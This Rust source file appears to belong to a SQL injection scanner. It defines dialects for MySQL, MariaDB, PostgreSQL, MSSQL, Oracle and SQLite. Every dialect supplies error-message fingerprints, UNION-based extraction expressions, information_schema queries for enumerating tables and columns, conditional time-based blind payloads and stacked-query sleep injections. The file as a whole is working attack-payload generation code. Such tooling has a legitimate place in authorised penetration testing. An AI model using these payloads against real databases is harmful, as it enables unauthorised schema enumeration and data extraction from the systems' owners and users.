//! Dialect implementations for the five major DBMS engines + MariaDB.

use super::dialect::DbmsDialect;

// ── MySQL ─────────────────────────────────────────────────────────────────────

pub struct MySQL;
impl DbmsDialect for MySQL {
    fn name(&self) -> &'static str { "MySQL" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("You have an error in your SQL syntax", "MySQL"),
            ("Warning: mysql_", "MySQL/PHP"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["@@version", "user()", "database()"]
    }

    fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
        vec!["CAST(%s AS CHAR)", "CONVERT(%s, CHAR)"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM information_schema.tables \
             WHERE table_schema=database() LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM information_schema.columns \
             WHERE table_schema=database() AND table_name='{}'",
            table
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns \
             WHERE table_schema=database() AND table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }

    fn sleep_function(&self, seconds: u64) -> String {
        format!("SLEEP({})", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        format!("IF({}, SLEEP({}), 0)", condition, seconds)
    }

    fn stacked_sleep_payload(&self, original_value: &str, seconds: u64) -> String {
        format!("{}; SELECT SLEEP({})-- ", original_value, seconds)
    }
}

// ── MariaDB ───────────────────────────────────────────────────────────────────

pub struct MariaDB;
impl DbmsDialect for MariaDB {
    fn name(&self) -> &'static str { "MariaDB" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[("MariaDB", "MariaDB")]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["@@version", "user()", "database()"]
    }

    fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
        vec!["CAST(%s AS CHAR)", "CONVERT(%s, CHAR)"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM information_schema.tables \
             WHERE table_schema=database() LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM information_schema.columns \
             WHERE table_schema=database() AND table_name='{}'",
            table
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns \
             WHERE table_schema=database() AND table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }

    fn sleep_function(&self, seconds: u64) -> String {
        format!("SLEEP({})", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        format!("IF({}, SLEEP({}), 0)", condition, seconds)
    }

    fn stacked_sleep_payload(&self, original_value: &str, seconds: u64) -> String {
        format!("{}; SELECT SLEEP({})-- ", original_value, seconds)
    }
}

// ── PostgreSQL ────────────────────────────────────────────────────────────────

pub struct PostgreSQL;
impl DbmsDialect for PostgreSQL {
    fn name(&self) -> &'static str { "PostgreSQL" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("ERROR: syntax error at or near", "PostgreSQL"),
            ("PostgreSQL query failed", "PostgreSQL"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["version()", "current_user", "current_database()"]
    }

    fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
        vec!["CAST(%s AS TEXT)", "(%s)::TEXT"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public'".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM information_schema.tables \
             WHERE table_schema='public' LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
            table
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns \
             WHERE table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }

    fn sleep_function(&self, seconds: u64) -> String {
        format!("pg_sleep({})", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        format!("CASE WHEN {} THEN pg_sleep({}) ELSE pg_sleep(0) END", condition, seconds)
    }

    fn stacked_sleep_payload(&self, original_value: &str, seconds: u64) -> String {
        format!("{}'; SELECT pg_sleep({})-- ", original_value, seconds)
    }
}

// ── MSSQL ─────────────────────────────────────────────────────────────────────

pub struct Mssql;
impl DbmsDialect for Mssql {
    fn name(&self) -> &'static str { "MSSQL" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("Microsoft OLE DB Provider for SQL Server", "MSSQL"),
            ("Incorrect syntax near", "MSSQL"),
            ("SQL Server Driver", "MSSQL"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["@@version", "system_user", "db_name()"]
    }

    fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
        vec!["CAST(%s AS VARCHAR)", "CONVERT(VARCHAR, %s)"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM (\
             SELECT table_name, ROW_NUMBER() OVER (ORDER BY table_name) AS rn \
             FROM information_schema.tables) t WHERE rn={}",
            index + 1
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
            table
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM (\
             SELECT column_name, ROW_NUMBER() OVER (ORDER BY ordinal_position) AS rn \
             FROM information_schema.columns WHERE table_name='{}') t WHERE rn={}",
            table, index + 1
        )
    }

    fn sleep_function(&self, seconds: u64) -> String {
        format!("WAITFOR DELAY '00:00:{:02}'", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        format!("IF ({}) WAITFOR DELAY '00:00:{:02}'", condition, seconds)
    }

    fn stacked_sleep_payload(&self, original_value: &str, seconds: u64) -> String {
        format!("{}; WAITFOR DELAY '00:00:{:02}'-- ", original_value, seconds)
    }

    /// MSSQL: WAITFOR cannot be used after AND — use stacked-query style instead.
    fn time_based_payload(&self, seconds: u64) -> String {
        format!("'; WAITFOR DELAY '00:00:{:02}'-- ", seconds)
    }
}

// ── Oracle ────────────────────────────────────────────────────────────────────

pub struct Oracle;
impl DbmsDialect for Oracle {
    fn name(&self) -> &'static str { "Oracle" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("ORA-00933", "Oracle"),
            ("ORA-01756", "Oracle"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        [
            "(SELECT banner FROM v$version WHERE rownum=1)",
            "user",
            "ora_database_name",
        ]
    }

    fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
        vec!["TO_CHAR(%s)", "CAST(%s AS VARCHAR2(4000))"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM user_tables".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM (\
             SELECT table_name, ROWNUM rn FROM user_tables) WHERE rn={}",
            index + 1
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM user_tab_columns WHERE table_name='{}'",
            table.to_uppercase()
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM (\
             SELECT column_name, ROWNUM rn FROM user_tab_columns WHERE table_name='{}') \
             WHERE rn={}",
            table.to_uppercase(), index + 1
        )
    }

    fn sleep_function(&self, seconds: u64) -> String {
        format!("DBMS_LOCK.SLEEP({})", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        format!("CASE WHEN {} THEN DBMS_LOCK.SLEEP({}) ELSE NULL END", condition, seconds)
    }

    // Oracle does not support stacked queries in standard form.
    fn stacked_sleep_payload(&self, _original_value: &str, _seconds: u64) -> String {
        String::new()
    }
}

// ── SQLite ────────────────────────────────────────────────────────────────────

pub struct Sqlite;
impl DbmsDialect for Sqlite {
    fn name(&self) -> &'static str { "SQLite" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("near \"X\": syntax error", "SQLite"),
            ("SQLITE_ERROR", "SQLite"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["(SELECT sqlite_version())", "(SELECT 'sqlite_user')", "(SELECT 'main')"]
    }

    fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
        vec!["CAST(%s AS TEXT)"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM sqlite_master WHERE type='table'".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!("SELECT COUNT(*) FROM pragma_table_info('{}')", table)
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!("SELECT name FROM pragma_table_info('{}') LIMIT 1 OFFSET {}", table, index)
    }

    fn char_code_function(&self) -> &'static str { "unicode" }
    fn substring_function(&self) -> &'static str { "substr" }

    fn sleep_function(&self, _seconds: u64) -> String {
        "randomblob(1000000000)".to_string()
    }

    fn conditional_sleep(&self, condition: &str, _seconds: u64) -> String {
        format!("CASE WHEN {} THEN randomblob(1000000000) ELSE 0 END", condition)
    }

    // Stacked queries are not supported in standard SQLite.
}
